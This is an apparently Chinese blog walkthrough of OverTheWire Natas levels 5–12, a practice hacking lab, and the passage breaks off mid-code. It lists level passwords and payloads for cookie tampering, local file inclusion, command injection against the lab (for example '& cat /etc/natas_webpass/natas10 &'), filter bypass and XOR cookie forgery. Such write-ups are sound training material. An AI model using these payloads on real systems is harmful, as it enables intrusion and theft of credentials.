<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213846501.png" alt="image-20200208213846501"></p>
<p>得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213858778.png" alt="image-20200208213858778"></p>
<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/P%5DFKZQYDR22UUF@%5BKTTY@7A.png" alt="img"></p>
<p>抓包查看：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208214521697.png" alt="image-20200208214521697"></p>
<p>修改Cookie里面的loggedin&#x3D;1即可得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208214612672.png" alt="image-20200208214612672"></p>
<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208214902828.png" alt="image-20200208214902828"></p>
<p>点击查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://natas.labs.overthewire.org/css/level.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://natas.labs.overthewire.org/css/wechall.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://natas.labs.overthewire.org/js/wechall-data.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> wechallinfo = &#123; <span class="string">&quot;level&quot;</span>: <span class="string">&quot;natas6&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;&lt;censored&gt;&quot;</span> &#125;;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas6<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">include &quot;includes/secret.inc&quot;;</span><br><span class="line"></span><br><span class="line">    if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</span><br><span class="line">        if($secret == $_POST[&#x27;secret&#x27;]) &#123;</span><br><span class="line">        print &quot;Access granted. The password for natas7 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        print &quot;Wrong secret&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">Input secret: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">secret</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现包含文件 <code>includes/secret.inc</code></p>
<p>访问之查看源码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215144760.png" alt="image-20200208215144760"></p>
<p>提交得到密码</p>
<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</span><br></pre></td></tr></table></figure>

<p>点击页面链接，发现地址栏变动，猜测文件包含</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215355851.png" alt="image-20200208215355851"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215403961.png" alt="image-20200208215403961"></p>
<p>当前页面源代码中带有提示：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215420947.png" alt="image-20200208215420947"></p>
<p>令 <code>page=/etc/natas_webpass/natas8</code> 即可得到密码</p>
<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe </span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas8<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;</span><br><span class="line"></span><br><span class="line">function encodeSecret($secret) &#123;</span><br><span class="line">    return bin2hex(strrev(base64_encode($secret)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</span><br><span class="line">    if(encodeSecret($_POST[&#x27;secret&#x27;]) == $encodedSecret) &#123;</span><br><span class="line">    print &quot;Access granted. The password for natas9 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    print &quot;Wrong secret&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">Input secret: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">secret</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值，其反函数为hex2bin()。</p>
</li>
<li><p>strrev() 函数反转字符串。</p>
</li>
<li><p>base64_encode() 函数进行base64加密。</p>
</li>
</ul>
<p>构造解码函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decodeSecret</span>(<span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>解码得到 <code>oubWYf2kBq</code>，提交得到密码</p>
<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas9<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Find words containing: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">needle</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Search</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    passthru(&quot;grep -i $key dictionary.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>猜测命令执行，提交 <code>| ls -al</code> 返回：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208220904544.png" alt="image-20200208220904544"></p>
<p>构造语句：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp; cat /etc/natas_webpass/natas10 &amp;</span><br></pre></td></tr></table></figure>

<p>得到下一关密码</p>
<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas10<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">For security reasons, we now filter on certain characters<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Find words containing: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">needle</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Search</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    if(preg_match(&#x27;/[;|&amp;]/&#x27;,$key)) &#123;</span><br><span class="line">        print &quot;Input contains an illegal character!&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        passthru(&quot;grep -i $key dictionary.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样是命令执行，不过这一次进行了正则过滤，过滤了 <code>; | &amp;</code> ，经过测试，<code>%0A</code> 也无效果。</p>
<p>这里利用 grep 查看文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -i . filename</span><br></pre></td></tr></table></figure>

<p>构造命令：<code>grep -i . /etc/natas_webpass/natas11 # dictionary.txt</code>, （<code>#</code> 用于注释后续内容）查看密码</p>
<h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209090045175.png" alt="image-20200209090045175"></p>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line"></span><br><span class="line">function xor_encrypt($in) &#123;</span><br><span class="line">    $key = &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;;</span><br><span class="line">    $text = $in;</span><br><span class="line">    $outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    // Iterate through each character</span><br><span class="line">    for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $outText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function loadData($def) &#123;</span><br><span class="line">    global $_COOKIE;</span><br><span class="line">    $mydata = $def;</span><br><span class="line">    if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123;</span><br><span class="line">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);</span><br><span class="line">    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123;</span><br><span class="line">        if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $tempdata[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">        $mydata[&#x27;showpassword&#x27;] = $tempdata[&#x27;showpassword&#x27;];</span><br><span class="line">        $mydata[&#x27;bgcolor&#x27;] = $tempdata[&#x27;bgcolor&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $mydata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function saveData($d) &#123;</span><br><span class="line">    setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $_REQUEST[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">        $data[&#x27;bgcolor&#x27;] = $_REQUEST[&#x27;bgcolor&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas11<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background: &lt;?=$data[&#x27;bgcolor&#x27;]?&gt;;&quot;</span>&gt;</span></span><br><span class="line">Cookies are protected with XOR encryption<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line">if($data[&quot;showpassword&quot;] == &quot;yes&quot;) &#123;</span><br><span class="line">    print &quot;The password for natas12 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Background color: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">bgcolor</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?=$data[&#x27;bgcolor&#x27;]?&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;Set color&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>进行代码审计，编写函数解密出 <code>$key</code> 的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$defaultdata</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>( <span class="string">&quot;showpassword&quot;</span>=&gt;<span class="string">&quot;no&quot;</span>, <span class="string">&quot;bgcolor&quot;</span>=&gt;<span class="string">&quot;#ffffff&quot;</span>));</span><br><span class="line"><span class="comment">// 从cookie中找到data的值</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calc</span>(<span class="params"><span class="variable">$defaultdata</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$defaultdata</span>;</span><br><span class="line">    <span class="variable">$outText</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$key</span> .=  <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$outText</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">calc</span>(<span class="variable">$defaultdata</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// 得到：qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</span></span><br><span class="line"><span class="comment">// 所以 $key = qw8J</span></span><br></pre></td></tr></table></figure>

<p>然后构造数据重写cookie：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span>(<span class="params"><span class="variable">$in</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;qw8J&#x27;</span>;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$in</span>;</span><br><span class="line">    <span class="variable">$outText</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// Iterate through each character</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$outText</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$outText</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>)), <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;showpassword&#x27;</span>] = <span class="string">&quot;yes&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr</span>)));</span><br><span class="line"><span class="comment">// 得到 ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</span></span><br></pre></td></tr></table></figure>

<p>修改数据包Cookie发送，得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209100311627.png" alt="image-20200209100311627"></p>
<h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209100452614.png" alt="image-20200209100452614"></p>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;? </span><br><span class="line"></span><br><span class="line">function genRandomString() &#123;</span><br><span class="line">    $length = 10;</span><br><span class="line">    $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;</span><br><span class="line">    $string = &quot;&quot;;    </span><br><span class="line"></span><br><span class="line">    for ($p = 0; $p &lt; $length; $p++) &#123;</span><br><span class="line">        $string .= $characters[mt_rand(0, strlen($characters)-1)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeRandomPath($dir, $ext) &#123;</span><br><span class="line">    do &#123;</span><br><span class="line">    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;</span><br><span class="line">    &#125; while(file_exists($path));</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeRandomPathFromFilename($dir, $fn) &#123;</span><br><span class="line">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span><br><span class="line">    return makeRandomPath($dir, $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;filename&quot;, $_POST)) &#123;</span><br><span class="line">    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(filesize($_FILES[&#x27;uploadedfile&#x27;][&#x27;tmp_name&#x27;]) &gt; 1000) &#123;</span><br><span class="line">        echo &quot;File is too big&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if(move_uploaded_file($_FILES[&#x27;uploadedfile&#x27;][&#x27;tmp_name&#x27;], $target_path)) &#123;</span><br><span class="line">            echo &quot;The file <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&quot;$<span class="attr">target_path</span>\&quot;&gt;</span>$target_path<span class="tag">&lt;/<span class="name">a</span>&gt;</span> has been uploaded&quot;;</span><br><span class="line">        &#125; else&#123;</span><br><span class="line">            echo &quot;There was an error uploading the file, please try again!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span 